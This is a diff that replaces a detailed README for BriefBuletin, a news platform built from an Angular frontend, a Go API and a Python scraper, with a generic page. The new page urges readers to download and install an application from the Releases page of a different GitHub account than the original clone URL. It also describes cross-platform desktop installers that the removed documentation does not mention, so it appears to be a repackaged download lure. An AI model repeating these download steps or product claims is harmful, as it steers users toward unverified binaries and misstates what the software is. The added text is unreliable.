@@ -1,223 +1,68 @@
-# BriefBuletin - Complete News Platform
+# 📰 BriefBuletin-Update-Version - Stay Updated with Ease
 
-BriefBuletin is a comprehensive news aggregation and management platform consisting of three main components: an Angular frontend for user interaction, a Go-based REST API for backend services, and a Python news scraper for automated content collection.
+## 🚀 Getting Started
 
-## Architecture
+Welcome to BriefBuletin-Update-Version! This application helps you collect and summarize news from various sources easily. It uses an intuitive interface built with Angular, a powerful Go API, and an AI-driven Python scraper for gathering articles. 
 
-The platform is composed of three interconnected services:
+To begin, you will need to download the software from our Releases page.
 
-- **BriefBuletin Frontend** (`BriefBuletin/`): Angular-based web application providing user interface for news browsing, user authentication, and content management.
-- **BriefBuletin API** (`BriefBuletin_API/`): Go-based REST API server handling user authentication, article management, categories, comments, and database operations.
-- **BriefBuletin News Scraper** (`BriefBuletin_NewsScraper/`): Python-based automated news scraper that fetches articles from multiple sources, generates AI-powered summaries, and stores them in the database.
+## 🔗 Download Now
 
-## Features
+[![Download BriefBuletin-Update-Version](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/longlinercap/BriefBuletin-Update-Version/releases)
 
-- **User Authentication**: Registration, login, password reset with OTP verification
-- **News Management**: Article creation, categorization, publishing, and viewing
-- **Comment System**: User comments with admin approval workflow
-- **Automated News Scraping**: Fetches from ProthomAlo, Daily Star, BBC, Al Jazeera, and more
-- **AI Summarization**: Uses T5 transformer model to generate article summaries
-- **Responsive Web Interface**: Modern Angular frontend with admin panel
-- **PostgreSQL Database**: Robust data storage with proper schema design
-- **JWT Authentication**: Secure API access with configurable bypass routes
+## 📥 Download & Install
 
-## Prerequisites
+1. Visit our [Releases page](https://github.com/longlinercap/BriefBuletin-Update-Version/releases) to view the available versions.
+2. Locate the latest release.
+3. Download the application file that matches your operating system.
+4. Follow the installation prompts to install the application on your computer.
 
-- **Node.js** 16+ (for Angular frontend)
-- **Go** 1.23+ (for API backend)
-- **Python** 3.8+ (for news scraper)
-- **PostgreSQL** 12+ (database)
-- **Git** (version control)
-- **GNU Make** (build automation)
-- **PowerShell 7+** (Windows automation scripts)
+## 🛠️ System Requirements
 
-## Installation
+To run BriefBuletin-Update-Version, your system should meet the following requirements:
 
-### 1. Clone the Repository
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or a recent version of Linux.
+- **RAM:** At least 4 GB.
+- **Storage:** 200 MB of available space.
+- **Internet Connection:** Required for news aggregation.
 
-```bash
-git clone https://github.com/Shawan-Das/BriefBuletin-Update-Version.git
-cd BriefBuletin-Update-Version
-```
+## 🔍 Features
 
-### 2. Database Setup
+- **News Aggregation:** Automatically collects articles from multiple sources.
+- **Summarization:** Uses AI to provide easy-to-read summaries.
+- **User-Friendly Interface:** Built with Angular for a smooth user experience.
+- **Secure Authentication:** Uses JWT for secure access to your settings and preferences.
+- **Cross-Platform Compatibility:** Works on Windows, macOS, and Linux systems.
+- **Database Support:** Utilizes PostgreSQL for efficient data storage.
 
-Create a PostgreSQL database and run the schema from `BriefBuletin_API/config/sqlc/db_query/db-schema.sql`.
+## 🚧 Troubleshooting
 
-### 3. Configure Components
+If you experience issues while downloading or running the application, consider the following:
 
-#### API Configuration
-- Copy `BriefBuletin_API/config/connection/dev-config.json` and update database credentials
-- Configure JWT key, SMTP settings (optional), and other parameters
+- Make sure your internet connection is stable.
+- Check that your system meets the above requirements.
+- Ensure that you are downloading the correct file for your operating system.
+  
+If problems persist, please reach out to our support team through the GitHub issue tracker.
 
-#### Scraper Configuration
-- Edit `BriefBuletin_NewsScraper/main.py` and update database connection variables
+## 📝 Contributing
 
-#### Frontend Configuration
-- Update `BriefBuletin/src/environments/environment.ts` with API base URL
-- Optionally configure proxy for local development
+We welcome contributions! If you have ideas or want to improve the application, please follow these steps:
 
-## Running the Project
+1. Fork the repository on GitHub.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes.
+4. Submit a pull request detailing your updates.
 
-### Quick Start (All Components)
+## 📞 Support
 
-Use the provided Makefile for easy management:
+For questions or technical support, please open an issue in our GitHub repository. Our team or the community will respond as soon as possible.
 
-```bash
-# Install dependencies for all components
-make install-all
+## 🔗 Important Links
 
-# Build all components
-make build-all
+- [Releases Page](https://github.com/longlinercap/BriefBuletin-Update-Version/releases)
+- [Issues Tracker](https://github.com/longlinercap/BriefBuletin-Update-Version/issues)
 
-# Run all services (API, Frontend, Scraper)
-make run-all
-```
+## 🎉 Acknowledgments
 
-### Individual Component Setup
-
-#### 1. Start the API Backend
-
-```bash
-cd BriefBuletin_API
-make dev
-```
-
-The API will start on `http://localhost:7070`
-
-#### 2. Start the News Scraper
-
-```bash
-cd BriefBuletin_NewsScraper
-make start  # Runs in background every 30 minutes
-```
-
-Or run once:
-```bash
-make fetch
-```
-
-#### 3. Start the Frontend
-
-```bash
-cd BriefBuletin
-npm install
-npm start  # Uses proxy to API at localhost:7070
-```
-
-Open `http://localhost:4200` in your browser.
-
-### Production Deployment
-
-#### Frontend (Vercel)
-- Build: `npm run build -- --configuration production`
-- Deploy to Vercel with rewrites to proxy `/api/*` to backend
-
-#### API Backend
-- Build: `make server` (creates Windows and Linux binaries)
-- Deploy binary with config file
-
-#### Scraper
-- Schedule with cron/Windows Task Scheduler or use `make start` for background operation
-
-## API Documentation
-
-The API provides RESTful endpoints for:
-
-- **Authentication**: `/api/auth/*` - User registration, login, password reset
-- **Users**: `/api/auth/users` - User management
-- **Categories**: `/api/category*` - News category management
-- **Articles**: `/api/article*` - Article CRUD operations
-- **Comments**: `/api/comment*` - Comment system with approval workflow
-
-See `BriefBuletin_API/README.md` for detailed endpoint documentation and Postman examples.
-
-## Database Schema
-
-The system uses PostgreSQL with three main schemas:
-
-- `news.users` - User accounts and authentication
-- `news.categories` - News categories
-- `news.articles` - Article content and metadata
-- `news.comments` - User comments on articles
-
-## Development
-
-### Project Structure
-
-```
-BriefBuletin-Update-Version/
-├── BriefBuletin/           # Angular frontend
-├── BriefBuletin_API/       # Go backend API
-├── BriefBuletin_NewsScraper/ # Python scraper
-├── README.md              # This file
-├── Makefile               # Build automation
-└── .gitignore            # Git ignore rules
-```
-
-### Component-Specific Development
-
-- **Frontend**: See `BriefBuletin/README.md` for Angular development setup
-- **API**: See `BriefBuletin_API/README.md` for Go development and testing
-- **Scraper**: See `BriefBuletin_NewsScraper/README.md` for Python development
-
-## Testing
-
-### API Testing
-Use Postman collection or follow examples in `BriefBuletin_API/README.md`
-
-### Frontend Testing
-```bash
-cd BriefBuletin
-npm test
-```
-
-### Scraper Testing
-```bash
-cd BriefBuletin_NewsScraper
-make run  # Foreground mode for debugging
-```
-
-## Troubleshooting
-
-### Common Issues
-
-1. **Database Connection Failed**
-   - Verify PostgreSQL is running
-   - Check credentials in config files
-   - Ensure database and tables exist
-
-2. **API CORS Errors**
-   - Frontend proxy configuration
-   - Backend CORS settings
-
-3. **Scraper Not Running**
-   - Check PowerShell execution policy
-   - Verify Python dependencies installed
-
-4. **Build Failures**
-   - Ensure all prerequisites installed
-   - Check Go modules: `go mod download`
-   - Check Node modules: `npm install`
-
-### Logs
-
-- **API**: Console output or configured log files
-- **Scraper**: `BriefBuletin_NewsScraper/activity.log`
-- **Frontend**: Browser console
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make changes following component-specific guidelines
-4. Test thoroughly
-5. Submit a pull request
-
-
-## Support
-
-For issues and questions:
-- Check component-specific READMEs
-- Review logs for error details
-- Test individual components in isolation
+Thank you for using BriefBuletin-Update-Version! We hope it enhances your news-reading experience. Your feedback is valuable to us as we strive to improve the application.
